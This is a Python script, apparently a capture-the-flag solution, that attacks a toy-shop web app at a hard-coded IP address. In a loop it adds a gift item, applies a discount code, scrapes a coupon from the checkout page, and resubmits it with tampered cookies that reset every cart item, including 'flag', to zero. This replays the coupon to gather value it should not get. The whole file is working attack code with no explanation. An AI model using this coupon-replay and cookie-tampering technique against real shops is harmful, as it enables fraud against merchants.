import requests
import re

for i in range(10):
    cookies = {
        'session': 'ea51840a-e498-4854-8c42-d2720ea79f77',
    }

    headers = {
        'Host': '14.225.211.39:5000',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        # 'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Connection': 'close',
        # 'Cookie': 'session=ea51840a-e498-4854-8c42-d2720ea79f77',
    }

    response = requests.get('http://14.225.211.39:5000/', cookies=cookies, headers=headers, verify=False)


    cookies = {
        'session': 'ea51840a-e498-4854-8c42-d2720ea79f77',
    }

    headers = {
        'Host': '14.225.211.39:5000',
        # 'Content-Length': '0',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'http://14.225.211.39:5000',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Referer': 'http://14.225.211.39:5000/item/gift',
        # 'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Connection': 'close',
        # 'Cookie': 'session=ea51840a-e498-4854-8c42-d2720ea79f77',
    }

    response = requests.post('http://14.225.211.39:5000/add_to_cart/gift', cookies=cookies, headers=headers, verify=False)

    cookies = {
        'session': 'ea51840a-e498-4854-8c42-d2720ea79f77',
        'gift': '1',
    }

    headers = {
        'Host': '14.225.211.39:5000',
        # 'Content-Length': '22',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'http://14.225.211.39:5000',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Referer': 'http://14.225.211.39:5000/cart',
        # 'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Connection': 'close',
        # 'Cookie': 'session=ea51840a-e498-4854-8c42-d2720ea79f77; gift=1',
    }

    data = {
        'discount_code': 'THANKYOU',
    }

    response = requests.post('http://14.225.211.39:5000/cart', cookies=cookies, headers=headers, data=data, verify=False)

    cookies = {
        'session': 'ea51840a-e498-4854-8c42-d2720ea79f77',
        'gift': '1',
    }

    headers = {
        'Host': '14.225.211.39:5000',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Referer': 'http://14.225.211.39:5000/cart',
        # 'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Connection': 'close',
        # 'Cookie': 'session=ea51840a-e498-4854-8c42-d2720ea79f77; gift=1',
    }

    params = ''

    response = requests.get('http://14.225.211.39:5000/checkout', params=params, cookies=cookies, headers=headers, verify=False)

    pattern = r'\b[A-Za-z0-9]{10}\b'

    matches = re.findall(pattern, response.text)

    cookies = {
        'session': 'ea51840a-e498-4854-8c42-d2720ea79f77',
        'doll': '0',
        'teddy': '0',
        'ball': '0',
        'gift': '0',
        'toy_car': '0',
        'puzzle': '0',
        'robot': '0',
        'kite': '0',
        'flag': '0',
        'yo_yo': '0',
        'building_blocks': '0',
        'stuffed_animal': '0',
        'remote_control_car': '0',
        'jump_rope': '0',
    }

    headers = {
        'Host': '14.225.211.39:5000',
        # 'Content-Length': '17',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'http://14.225.211.39:5000',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Referer': 'http://14.225.211.39:5000/',
        # 'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Connection': 'close',
        # 'Cookie': 'session=ea51840a-e498-4854-8c42-d2720ea79f77; doll=0; teddy=0; ball=0; gift=0; toy_car=0; puzzle=0; robot=0; kite=0; flag=0; yo_yo=0; building_blocks=0; stuffed_animal=0; remote_control_car=0; jump_rope=0',
    }

    data = {
        'coupon': f'{matches[1]}',
    }

    response = requests.post('http://14.225.211.39:5000/submit_coupon', cookies=cookies, headers=headers, data=data, verify=False)

    cookies = {
        'session': 'ea51840a-e498-4854-8c42-d2720ea79f77',
        'doll': '0',
        'teddy': '0',
        'ball': '0',
        'gift': '0',
        'toy_car': '0',
        'puzzle': '0',
        'robot': '0',
        'kite': '0',
        'flag': '0',
        'yo_yo': '0',
        'building_blocks': '0',
        'stuffed_animal': '0',
        'remote_control_car': '0',
        'jump_rope': '0',
    }

    headers = {
        'Host': '14.225.211.39:5000',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        # 'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Connection': 'close',
        # 'Cookie': 'session=ea51840a-e498-4854-8c42-d2720ea79f77; doll=0; teddy=0; ball=0; gift=0; toy_car=0; puzzle=0; robot=0; kite=0; flag=0; yo_yo=0; building_blocks=0; stuffed_animal=0; remote_control_car=0; jump_rope=0',
    }

    response = requests.get('http://14.225.211.39:5000/', cookies=cookies, headers=headers, verify=False)

    print(response.text)

